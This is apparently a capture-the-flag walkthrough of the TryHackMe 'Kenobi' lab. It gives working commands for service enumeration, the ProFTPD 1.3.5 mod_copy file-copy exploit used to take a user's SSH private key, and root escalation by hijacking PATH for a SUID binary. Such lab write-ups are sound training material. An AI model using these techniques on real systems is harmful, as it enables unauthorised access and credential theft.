# TryHackMe Kenobi

> Author: Hades

> [*Scripting here*](https://github.com/leecybersec/scripting)

## VM Details

|**Name**|[Kenobi](https://tryhackme.com/room/kenobi)|
|---|---|
|**Date release**|583 days old (9/4/2021)|
|**Created by**|[tryhackme](https://tryhackme.com/p/tryhackme)|

## Information Gathering

### Openning Services

```
### Port Scanning ############################
nmap -sS -Pn -p- --min-rate 1000 10.10.66.44
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

[+] Openning ports: 21,22,80,111,139,445,2049,42579,43785,45127,60161

### Services Enumeration ############################
nmap -sC -sV -Pn 10.10.66.44 -p21,22,80,111,139,445,2049,42579,43785,45127,60161
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 16:30 +07
Nmap scan report for 10.10.66.44
Host is up (0.23s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      34289/tcp6  mountd
|   100005  1,2,3      45127/tcp   mountd
|   100005  1,2,3      46994/udp   mountd
|   100005  1,2,3      51348/udp6  mountd
|   100021  1,3,4      37099/tcp6  nlockmgr
|   100021  1,3,4      42579/tcp   nlockmgr
|   100021  1,3,4      53493/udp6  nlockmgr
|   100021  1,3,4      54131/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
42579/tcp open  nlockmgr    1-4 (RPC #100021)
43785/tcp open  mountd      1-3 (RPC #100005)
45127/tcp open  mountd      1-3 (RPC #100005)
60161/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -2s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-04-09T04:30:44-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-09T09:30:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.90 seconds
```

### ProFTPD 1.3.5 21

At port 21, I try to login to service ftp with `anonymous` credential, but it's fail

```
┌──(Hades㉿10.11.32.198)-[3.0:20.0]~
└─$ ftp 10.10.66.44
Connected to 10.10.66.44.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.66.44]
Name (10.10.66.44:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Search public exploit with `searchsploit`

```
┌──(Hades㉿10.11.32.198)-[3.0:20.0]~
└─$ searchsploit ProFTPD 1.3.5
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)   | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution         | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                   | linux/remote/36742.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

Based on `'mod_copy'` exploit, it allow copy file to another location in the server without authentication.

### Apache httpd 2.4.18

At port 80, the home page is showing only an image. But when I enum file `robots.txt`, I got uri `admin.html`.

```
┌──(Hades㉿10.11.32.198)-[3.0:20.0]~
└─$ curl http://10.10.66.44/robots.txt
User-agent: *
Disallow: /admin.html
```

At `http://10.10.66.44/admin.html` is also an image.

### Server Message Block

Enum service SMB with `smbmap`, it shows folder `anonymous` can be access by guest with read only permission.

```
### SMB Enumeration (445) ############################
smbmap -H 10.10.66.44 -u guest
[+] Guest session       IP: 10.10.66.44:445     Name: 10.10.66.44
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
```

Go to folder `anonymous` in the server and I got file log.txt

```
┌──(Hades㉿10.11.32.198)-[3.0:28.0]~
└─$ smbclient //10.10.66.44/anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 17:49:09 2019
  ..                                  D        0  Wed Sep  4 17:56:07 2019
  log.txt                             N    12237  Wed Sep  4 17:49:09 2019
<snip>
```

Download file log.txt by using `get log.txt` and read it. File `log.txt` show that:

>User kenobi has generated public/private rsa key and save it to `/home/kenobi/.ssh/`

```
┌──(Hades㉿10.11.32.198)-[3.0:27.0]~/walkthrough/tryhackme/kenobi
└─$ cat log.txt  
<snip>
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
<snip>
```

### Remote Procedure Call 

```
### RPC Enumeration (111) ############################
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.66.44
<snip>
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
<snip>

| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1842988.0  6870640.0  22%   16.0T        32000

Nmap done: 1 IP address (1 host up) scanned in 3.50 seconds
```

RPC Service shows that folder `var` was sharing and can be mount.

```
┌──(Hades㉿10.11.32.198)-[2.9:27.0]~/walkthrough/tryhackme/kenobi
└─$ sudo mount 10.10.66.44:/var /mnt/var
[sudo] password for kali: 
                                                                                                                                                                            
┌──(Hades㉿10.11.32.198)-[2.9:27.1]~/walkthrough/tryhackme/kenobi
└─$ ls /mnt/var 
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
```

## Foothold

### 'mod_copy' to read ssh

I using `mod_copy` vulnerability in ftp service `linux/remote/36742.txt` and copy file private key at `/home/kenobi/.ssh/id_rsa` to folder `/var/tmp`.

```
ftp> site cpfr /home/kenobi/.ssh/id_rsa                                                                                                                                     
350 File or directory exists, ready for destination name                                                                                                                    
ftp> site cpto /var/tmp/id_rsa                                                                                                                                              
250 Copy successful
```

Check in folder `/var/tmp` and copy file `id_rsa` to kali machine.

```
┌──(Hades㉿10.11.32.198)-[2.8:27.2]~/walkthrough/tryhackme/kenobi
└─$ ls -l /mnt/var/tmp/id_rsa
-rw-r--r-- 1 kali kali 1675 Apr  9 17:23 /mnt/var/tmp/id_rsa
┌──(Hades㉿10.11.32.198)-[2.8:27.7]~/walkthrough/tryhackme/kenobi
└─$ cp /mnt/var/tmp/id_rsa .
```

Using ssh with private key connect to server and got user access.

```
┌──(Hades㉿10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi
└─$ chmod 600 id_rsa
                                                                                                                                                                            
┌──(Hades㉿10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi
└─$ ssh -i id_rsa kenobi@10.10.66.44
<snip>
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

## Privilege Escalation

### Path Command Overwrite 

After enum in local machine, I saw an uncommon file have SUID can run as root.

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
<snip>
/usr/bin/menu
<snip>
kenobi@kenobi:~$ ls -l /usr/bin/menu
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
```

Checking string in file `menu` using `strings`, I can see some command execute after run file `curl`, `uname` and `ifconfig`.

```
kenobi@kenobi:~$ strings /usr/bin/menu
<snip>
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
<snip>
```

Let's add file `ifconfig` to folder `/tmp`, and file `ifconfig` contain bash shell execution.

```
kenobi@kenobi:~$ echo sh > /tmp/ifconfig
kenobi@kenobi:~$ chmod 777 /tmp/ifconfig
```

Add the folder `/tmp` to the first PATH

```
kenobi@kenobi:~$ export PATH=/tmp/:$PATH
```

Run file `/usr/bin/menu` and execute command `ifconfig` to get root shell

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# id            
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```